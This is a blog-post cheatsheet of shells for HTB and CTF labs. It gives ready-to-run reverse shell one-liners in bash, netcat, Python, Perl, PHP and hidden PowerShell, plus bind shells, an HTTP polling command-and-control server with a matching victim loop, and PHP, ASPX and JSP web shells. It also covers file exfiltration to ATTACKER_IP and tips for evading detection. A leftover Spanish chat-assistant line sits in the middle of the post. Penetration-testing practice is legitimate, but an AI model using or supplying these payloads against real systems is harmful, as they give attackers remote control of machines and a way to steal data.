---
layout: post
title: "Reverse Shells & Web Shells Cheatsheet"
subtitle: "Quick shells for HTB/CTFs: reverse shells, bind shells, web shells, upgrades and fallback techniques"
tags: [shells, reverse-shells, webshell, hacking, htb, ctf]
---

Compact cheatsheet for quick shell generation during HTB/CTFs: reverse shells, bind shells, simple web shells, stable TTY upgrades, and fallback access methods.

---

# 1. REVERSE SHELL ONE-LINERS

## Bash Reverse Shell
```

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

```

## Netcat (classic -e)
```

nc -e /bin/bash ATTACKER_IP 4444

```

## Netcat (no -e, Debian-based)
```

rm /tmp/f; mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1

```

## Python
```

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn("/bin/bash")'

```

## Perl
```

perl -e 'use Socket;$i=inet_aton("ATTACKER_IP");$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,pack("SnA4x8",2,$p,$i));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

```

## PHP
```

php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

```

## PowerShell (Windows)
```

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS > ';$w=[Text.Encoding]::ASCII.GetBytes($o2);$s.Write($w,0,$w.Length)}"

```

---

# 2. BIND SHELLS

## Netcat Bind Shell
### Victim:
```

nc -lvnp 4444 -e /bin/bash

```
### Attacker:
```

nc VICTIM_IP 4444

```

## PowerShell Bind Shell
```

powershell -c "$l=[System.Net.Sockets.TcpListener]4444;$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object Byte[] 1024;while(($r=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$r);$o=iex $d 2>&1|Out-String;$s.Write(([Text.Encoding]::ASCII).GetBytes($o),0,$o.Length)}"

```

---

Aquí tienes **solo el apartado 3**, completamente revisado, **en inglés**, **claro**, **completo**, y **listo para pegar en tu post Jekyll en formato Markdown**, siguiendo exactamente el estilo de tu cheatsheet.

---

# 3. HTTP-BASED REVERSE SHELL (PULL MODEL)

Useful when outbound HTTP is allowed but inbound connections (reverse shells) are blocked.  
The victim continuously pulls commands from the attacker and sends back the output.

---

## 3.1 Attacker Side (Python HTTP Command Server)

Create a working directory:
```

mkdir handler
cd handler
echo "id" > cmd        # initial command
touch cmd_out

```

Use this Python server to expose two endpoints:
- **GET /cmd** → the victim retrieves commands  
- **POST /cmd_out** → the victim sends back command output  

Save as `server.py`:
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/cmd":
            with open("cmd", "r") as f:
                command = f.read()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(command.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/cmd_out":
            length = int(self.headers["Content-Length"])
            data = self.rfile.read(length).decode()
            with open("cmd_out", "w") as f:
                f.write(data)
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

server = HTTPServer(("0.0.0.0", 80), Handler)
print("[+] Listening on port 80...")
server.serve_forever()
```

Run it:

```
sudo python3 server.py
```

### Updating commands & reading output

Write a new command:

```
echo "ls -la /tmp" > cmd
```

Read the victim's output:

```
cat cmd_out
```

---

## 3.2 Victim Side (Polling & Output Posting Loop)

Victim executes this loop:

```
while true; do
  cmd=$(curl -s http://ATTACKER_IP/cmd)
  out=$(sh -c "$cmd" 2>&1)
  curl -X POST -d "$out" http://ATTACKER_IP/cmd_out
  sleep 1
done
```

---

### Notes

* Works well when only **HTTP outbound** is whitelisted.
* Evasion-friendly: can spoof User-Agents, add jitter, use HTTPS, or randomize polling intervals.
* Not fully interactive, but reliable in restricted environments where other reverse shells fail.

---

# 4. WEB SHELLS

## PHP Web Shell – Classic One-Liner
```

<?php system($_GET['cmd']); ?>

```
Usage:
```

/shell.php?cmd=id

```

## PHP POST Web Shell
```

<?php echo shell_exec($_POST['cmd']); ?>

```

## ASPX Simple Web Shell
```

<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"])); %>

```

## JSP Web Shell
```

<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
int a;
while ((a = in.read()) != -1) out.print((char)a);
}
%>

```

---

# 5. SHELL UPGRADE TO FULL TTY

## Python PTY
```

python3 -c 'import pty; pty.spawn("/bin/bash")'

```

## **Better terminal controls**
Inside shell:
```

Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm

```

## **Socat Fully Interactive Reverse Shell**

### Attacker:
```

socat file:`tty`,raw,echo=0 tcp-listen:4444

```

### Victim:
```

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

```

---

# 6. FILE TRANSFER METHODS (WHEN SHELL IS LIMITED)

## Download from attacker
```

curl http://ATTACKER_IP/file -o out
wget http://ATTACKER_IP/file -O out

```

## Upload to attacker using netcat

### Attacker:
```

nc -lvnp 9001 > file.out

```

### Victim:
```

nc ATTACKER_IP 9001 < file.txt

```

## **Base64 transfer**
### Victim:
```

base64 file.txt

```
### Attacker:
```

echo "<base64>" | base64 -d > file.txt

```

---

# Final Notes

This cheatsheet provides:
- Fast reverse shells for common languages  
- Bind shells  
- Simple web shells (PHP, ASPX, JSP)  
- Stable terminal upgrades  

Useful for HTB, OSCP labs, and any CTF requiring rapid shell access.

---